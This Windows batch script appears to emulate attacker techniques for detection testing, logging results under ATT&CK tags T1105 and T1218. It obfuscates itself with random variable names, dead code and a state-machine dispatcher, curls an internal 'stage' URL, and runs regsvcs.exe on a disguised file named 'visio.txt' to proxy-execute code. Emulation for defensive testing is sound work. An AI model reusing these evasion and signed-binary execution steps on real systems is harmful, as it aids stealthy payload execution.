@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8712\1adc49d0
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8712-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=visio.txt
SET dvhhyc=8712

REM Internal random variables
SET qzlpr=0
SET yknwfv=!txisnba!
SET bsgtrn=!xzanpex!
SET mxcqv=!rrocubc!
SET logpath=%APPDATA%\!mxcqv!\macula-simulations.log

GOTO zqwxc

REM Dead code block never reached
:akjdhg
ECHO Never executed>>nul
SET fakevar=dead_code
GOTO mnbvfg

:zxcvbn
REM More dead code
EXIT /B 1

:zqwxc
SET state=0
GOTO dispatch_plk

:dead_ytrew
REM Unreachable code for obfuscation
IF 1==0 (
    GOTO real_code
) ELSE (
    GOTO another_dead
)

:another_dead
EXIT /B 0

:dispatch_plk
IF !state!==0 GOTO init_random
IF !state!==17 GOTO heartbeat_start
IF !state!==42 GOTO change_directory
IF !state!==99 GOTO execute_dll
GOTO finish_end

REM Dead dispatch target
:fake_dispatch
EXIT /B 1

:init_random
SET logdate=!DATE:/=-!
SET logtime=!TIME!
ECHO [!logdate! !logtime!][DEBUG][!jwcnifl!]: script_init_start>> "!logpath!" 2>nul
SET /A delay=%RANDOM% %% 20 + 10
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: delay_start=!delay!s>> "!logpath!" 2>nul
timeout /t !delay! /nobreak >nul
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: delay_complete>> "!logpath!" 2>nul
SET state=17
GOTO dispatch_plk

:heartbeat_start
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!logpath!" 2>nul
curl -k -s -o nul "!keghkgto!"
IF !ERRORLEVEL!==0 (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: heartbeat_success>> "!logpath!" 2>nul
    SET hb_result=1
    SET hb_err=
) ELSE (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: heartbeat_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
    SET hb_result=0
    SET hb_err=connection_failed
)
ECHO [!DATE:/=-! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!hb_result!:!hb_err!>> "!logpath!" 2>nul
timeout /t 15 /nobreak >nul
SET state=42
GOTO dispatch_plk

:change_directory
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!yknwfv!>> "!logpath!" 2>nul
cd /d "!yknwfv!" 2>nul
IF !ERRORLEVEL!==0 (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: chdir_success>> "!logpath!" 2>nul
) ELSE (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: chdir_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
)
ping -n 8 127.0.0.1 >nul
SET state=99
GOTO dispatch_plk

:execute_dll
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: regsvcs_start=!bsgtrn!>> "!logpath!" 2>nul
regsvcs.exe "!bsgtrn!"
IF !ERRORLEVEL!==0 (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: regsvcs_success>> "!logpath!" 2>nul
    SET exec_result=1
    SET exec_err=
) ELSE (
    ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: regsvcs_failed=!ERRORLEVEL!>> "!logpath!" 2>nul
    SET exec_result=0
    SET exec_err=assembly_load_failed
)
ECHO [!DATE:/=-! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!exec_result!:!exec_err!>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
SET state=100
GOTO finish_end

:finish_end
ECHO [!DATE:/=-! !TIME!][DEBUG][!jwcnifl!]: script_complete>> "!logpath!" 2>nul
ENDLOCAL